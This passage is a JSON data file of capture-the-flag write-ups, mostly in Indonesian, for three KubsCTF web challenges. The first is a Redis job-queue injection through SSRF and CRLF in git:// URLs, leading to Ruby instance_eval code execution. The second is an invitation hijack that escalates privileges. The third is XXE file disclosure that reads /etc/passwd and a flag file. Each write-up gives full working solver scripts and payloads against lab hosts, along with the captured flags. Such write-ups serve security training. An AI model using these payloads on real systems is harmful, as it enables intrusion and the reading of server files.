        "content": "Saya enqueue job berikut:\n\n\n\nSaat job diproses, aplikasi menjalankan:\n\n\n\ndan hasilnya muncul langsung di endpoint job detail.",
        "code": "{\n  \"class\": \"String\",\n  \"args\": [\"instance_eval\", \"File.read(\\\"/root/flag.txt\\\")\"],\n  \"jid\": \"<random>\"\n}"
      },
      {
        "title": "Remediation",
        "content": "1. **Block internal network access from repository importers** — terutama ke `127.0.0.0/8`, `0.0.0.0`, RFC1918, dan service internal lain\n2. **Do not treat `git://` paths as opaque TCP input** — normalisasi dan validasi URL sebelum koneksi dibuat\n3. **Protect Redis** — bind ke socket lokal/private interface, aktifkan auth/ACL, dan jangan biarkan service untrusted mengirim command mentah\n4. **Use strict worker allowlists** — jangan `constantize` nama class dari payload queue yang bisa dimanipulasi\n5. **Avoid dynamic method dispatch from untrusted args** — jangan pernah menjalankan `send(args[0], ...)` pada object buatan attacker\n6. **Restrict job introspection endpoints** — `/api/jobs` seharusnya tidak dapat diakses user biasa, apalagi menampilkan hasil eksekusi mentah\n\n---"
      },
      {
        "title": "Attack Flow",
        "content": "",
        "code": "Login as standard user\n      │\n      ▼\nInspect Import Repository feature\n      │\n      ▼\nUse git://0.0.0.0:6379 with CRLF injection\n      │\n      ▼\nConfirm Redis access via import log\n      │\n      ▼\nRPUSH malicious job into queue:default\n      │\n      ▼\nObserve execution through /api/jobs\n      │\n      ▼\nDiscover execution pattern: klass.new + method dispatch\n      │\n      ▼\nUse String.instance_eval as Ruby gadget\n      │\n      ▼\nExecute File.read(\"/root/flag.txt\")\n      │\n      ▼\nRead flag from job result"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solver.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nimport json\r\nimport re\r\nimport secrets\r\nimport time\r\nimport urllib.parse\r\n\r\nimport requests\r\n\r\n\r\nBASE_URL = \"https://501fe2e0-7eb0-499a-ae91-89f6852600c5.labs.hackadvisor.io\"\r\nEMAIL = \"user@test.com\"\r\nPASSWORD = \"password123\"\r\n\r\n\r\ndef enqueue_job(session, worker_class, args):\r\n    jid = secrets.token_hex(12)\r\n    payload = json.dumps({\"class\": worker_class, \"args\": args, \"jid\": jid})\r\n    redis_cmd = (\r\n        f\"*3\\r\\n\"\r\n        f\"$5\\r\\nRPUSH\\r\\n\"\r\n        f\"$13\\r\\nqueue:default\\r\\n\"\r\n        f\"${len(payload)}\\r\\n{payload}\\r\\n\"\r\n    )\r\n    git_url = \"git://0.0.0.0:6379/%0D%0A\" + urllib.parse.quote(redis_cmd) + \"%0D%0A\"\r\n\r\n    response = session.post(\r\n        f\"{BASE_URL}/api/projects/import\",\r\n        json={\"name\": f\"solve-{jid[:6]}\", \"url\": git_url},\r\n        timeout=15,\r\n    )\r\n    response.raise_for_status()\r\n    return jid\r\n\r\n\r\ndef wait_for_job(session, jid, timeout=15):\r\n    deadline = time.time() + timeout\r\n    while time.time() < deadline:\r\n        response = session.get(f\"{BASE_URL}/api/jobs/{jid}\", timeout=10)\r\n        if response.status_code == 200:\r\n            return response.json()\r\n        time.sleep(0.5)\r\n    raise TimeoutError(f\"job {jid} did not appear in time\")\r\n\r\n\r\ndef main():\r\n    session = requests.Session()\r\n    login = session.post(\r\n        f\"{BASE_URL}/login\",\r\n        data={\"email\": EMAIL, \"password\": PASSWORD},\r\n        timeout=15,\r\n    )\r\n    login.raise_for_status()\r\n\r\n    jid = enqueue_job(session, \"String\", [\"instance_eval\", 'File.read(\"/root/flag.txt\")'])\r\n    job = wait_for_job(session, jid)\r\n\r\n    result = job.get(\"result\", \"\")\r\n    match = re.search(r\"KubSTU\\{[^}]+\\}\", result)\r\n    if not match:\r\n        raise RuntimeError(f\"flag not found in job result: {result!r}\")\r\n\r\n    print(match.group(0))\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "KubSTU{50b900eb985c28468640b012a3edbcec}",
    "lessonsLearned": ""
  },
  {
    "id": "kubsuctf-web-teamforge",
    "title": "- KubSTU CTF: TeamForge",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "KubsCTF",
    "tags": [],
    "description": "Writeup for challenge - KubSTU CTF: TeamForge",
    "problemDescription": "",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Deskripsi Challenge",
        "content": "TeamForge adalah platform kolaborasi tim dengan kontrol akses berbasis peran (Owner, Admin, Member). Kita diberikan akun Member biasa (`user@test.com`) dan tujuan kita adalah melakukan privilege escalation ke Admin atau Owner untuk mendapatkan flag yang ada di admin dashboard."
      },
      {
        "title": "1. Eksplorasi Awal",
        "content": "Pertama, saya login menggunakan kredensial yang diberikan: `user@test.com` / `password123`. Setelah masuk, saya melihat dashboard yang menunjukkan bahwa saya adalah Member di organisasi \"Beta Labs\". \n\nSaya mencoba mengakses beberapa endpoint sensitif seperti `/admin` atau `/org/2/settings`, namun mendapatkan error 404 atau 403 (Forbidden)."
      },
      {
        "title": "2. Menemukan Kerentanan (Broken Access Control)",
        "content": "Sambil menelusuri aplikasi, saya mencoba melakukan testing pada IDOR (Insecure Direct Object Reference) atau akses kontrol yang lemah. Saya menemukan bahwa endpoint `/org/1/team` dapat diakses meskipun saya bukan anggota dari organisasi tersebut (Org 1 - Acme Corp)."
      },
      {
        "title": "3. Kebocoran Informasi (Information Leakage)",
        "content": "Di halaman `/org/1/team`, terdapat bagian \"Pending Invitations\". Di sana terdapat komentar HTML yang cukup mencolok: `<!-- Pending Invitations - VULNERABLE: Email addresses are visible! -->`. \n\nHalaman tersebut menunjukkan bahwa ada satu undangan tertunda untuk email `victoria.chase@acme.com` dengan peran sebagai **Owner**."
      },
      {
        "title": "4. Eksploitasi (Invitation Hijacking)",
        "content": "Karena sistem pendaftaran tidak memerlukan verifikasi email (\"No verification required - your account will be active immediately!\"), saya memanfaatkan informasi ini dengan cara:\n1. Mendaftar akun baru menggunakan email `victoria.chase@acme.com`.\n2. Setelah mendaftar dan login, saya melihat notifikasi di dashboard bahwa saya memiliki undangan tertunda untuk bergabung dengan \"Acme Corp\" sebagai Owner.\n3. Saya menuju halaman `/invitations` dan menerima undangan tersebut."
      },
      {
        "title": "Kesimpulan",
        "content": "Vulnerability utama dalam aplikasi ini adalah **Broken Access Control** pada halaman manajemen tim yang membocorkan alamat email dari undangan yang sedang tertunda. Dikombinasikan dengan sistem registrasi tanpa verifikasi, penyerang dapat mengambil alih peran (hijacking role) yang dimaksudkan untuk orang lain."
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (exploit.py) is provided below:",
        "code": "import requests\r\n\r\nBASE_URL = \"https://4c1ab429-fd50-4645-987d-c28eef4349b2.labs.hackadvisor.io\"\r\nsession = requests.Session()\r\n\r\ndef login(email, password):\r\n    url = f\"{BASE_URL}/login\"\r\n    data = {\"email\": email, \"password\": password}\r\n    response = session.post(url, data=data, allow_redirects=True)\r\n    return response\r\n\r\ndef get_dashboard():\r\n    url = f\"{BASE_URL}/dashboard\"\r\n    response = session.get(url)\r\n    return response\r\n\r\ndef get_path(path):\r\n    url = f\"{BASE_URL}{path}\"\r\n    response = session.get(url)\r\n    return response\r\n\r\ndef post_invite(org_id, email, role):\r\n    url = f\"{BASE_URL}/org/{org_id}/invite\"\r\n    data = {\"email\": email, \"role\": role}\r\n    response = session.post(url, data=data)\r\n    return response\r\n\r\ndef register(username, email, password):\r\n    url = f\"{BASE_URL}/register\"\r\n    data = {\"username\": username, \"email\": email, \"password\": password}\r\n    response = session.post(url, data=data, allow_redirects=True)\r\n    return response\r\n\r\ndef accept_invitation(invite_id):\r\n    url = f\"{BASE_URL}/invitations/{invite_id}/accept\"\r\n    response = session.post(url, allow_redirects=True)\r\n    return response\r\n\r\nif __name__ == \"__main__\":\r\n    resp = login(\"victoria.chase@acme.com\", \"password123\")\r\n    r_team = get_path(\"/org/1/team\")\r\n    print(r_team.text)"
      }
    ],
    "terminalOutputs": [],
    "flag": "KubSTU{21509994fd5a1383bfb6b4c4d85b4cf0}",
    "lessonsLearned": ""
  },
  {
    "id": "kubsuctf-web--",
    "title": "- Библиотека Капибара-Сити",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "KubsCTF",
    "tags": [],
    "description": "Challenge ini ternyata cukup lurus arahnya begitu halaman depan dibuka. Di UI ada form cek buku berdasarkan ID, dan JavaScript di halaman itu membentuk request XML mentah ke endpoint `/check_book`:",
    "problemDescription": "Challenge ini ternyata cukup lurus arahnya begitu halaman depan dibuka. Di UI ada form cek buku berdasarkan ID, dan JavaScript di halaman itu membentuk request XML mentah ke endpoint `/check_book`:\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<book>\n    <id>1</id>\n</book>\n```\n\nItu langsung bikin saya curiga ke parser XML di backend, terutama karena deskripsi challenge juga bilang ada petunjuk yang disembunyikan \"di server sendiri\" dan \"di file yang terlupakan\". Kombinasi hint seperti itu sangat sering mengarah ke file disclosure lewat XXE.",
    "tools": [],
    "analysis": "Request normal ke endpoint:\n\n```bash\ncurl -i http://31.129.105.124/check_book \\\n  -H 'Content-Type: application/xml' \\\n  --data '<?xml version=\"1.0\"?><book><id>1</id></book>'\n```\n\nServer membalas dengan hasil pencarian buku yang valid. Jadi endpoint memang memproses XML input dari user.\n\nLalu saya tes XXE sederhana dengan membaca `/etc/passwd`:\n\n```bash\ncurl http://31.129.105.124/check_book \\\n  -H 'Content-Type: application/xml' \\\n  --data-binary $'<?xml version=\"1.0\"?>\\n<!DOCTYPE book [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\\n<book><id>&xxe;</id></book>'\n```\n\nHasilnya berhasil keluar isi `/etc/passwd`. Berarti parser XML di backend mengizinkan external entity dan menaruh hasil expand entity itu langsung ke elemen `<id>`, lalu memantulkannya lagi ke response.",
    "solution": [
      {
        "title": "Akar Masalah",
        "content": "Vulnerabilitas utamanya adalah **XML External Entity Injection (XXE)**.\n\nBackend menerima XML dari user tanpa mematikan resolusi external entity. Dengan begitu kita bisa:\n\n- mendefinisikan entity sendiri di bagian `DOCTYPE`\n- mengarahkannya ke file lokal dengan `SYSTEM \"file:///...\"`\n- memanggil entity itu di dalam tag `<id>`\n- membiarkan backend membaca file lokal dan mengembalikan isinya ke response"
      },
      {
        "title": "Eksploitasi",
        "content": "Setelah XXE terkonfirmasi, target berikutnya adalah cari lokasi flag. Saya sempat cek beberapa path umum, dan file yang benar ternyata ada di:\n\n\n\nPayload final:\n\n\n\nRequest:\n\n\n\nResponse:",
        "code": "/app/flag.txt"
      },
      {
        "title": "Catatan",
        "content": "Kalau challenge seperti ini muncul lagi, pattern yang patut dicurigai adalah:\n\n- frontend mengirim XML langsung dari input user\n- backend mengembalikan hasil parse ke response\n- ada hint soal file lokal, config, notes, secret, atau petunjuk \"di server\"\n\nBegitu tiga hal itu ketemu, XXE hampir selalu layak jadi hipotesis pertama."
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\n\r\nimport re\r\nimport sys\r\n\r\nimport requests\r\n\r\n\r\nDEFAULT_TARGET = \"http://31.129.105.124\"\r\nDEFAULT_FILE = \"/app/flag.txt\"\r\n\r\n\r\ndef build_payload(file_path: str) -> str:\r\n    return f\"\"\"<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n<!DOCTYPE book [\r\n  <!ENTITY xxe SYSTEM \"file://{file_path}\">\r\n]>\r\n<book>\r\n  <id>&xxe;</id>\r\n</book>\"\"\"\r\n\r\n\r\ndef extract_result(body: str) -> str:\r\n    match = re.search(r\"Результат поиска:\\s*(.*)\", body, re.DOTALL)\r\n    if match:\r\n        return match.group(1).strip()\r\n    return body.strip()\r\n\r\n\r\ndef main() -> int:\r\n    target = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_TARGET\r\n    file_path = sys.argv[2] if len(sys.argv) > 2 else DEFAULT_FILE\r\n\r\n    payload = build_payload(file_path)\r\n\r\n    response = requests.post(\r\n        f\"{target.rstrip('/')}/check_book\",\r\n        data=payload.encode(),\r\n        headers={\"Content-Type\": \"application/xml\"},\r\n        timeout=10,\r\n    )\r\n    response.raise_for_status()\r\n\r\n    print(extract_result(response.text))\r\n    return 0\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    raise SystemExit(main())"
      }
    ],
    "terminalOutputs": [],
    "flag": "capyCTF{xxe_1s_v3ry_c0mmon_1n_capy_l1brary}",
    "lessonsLearned": ""
  }
];
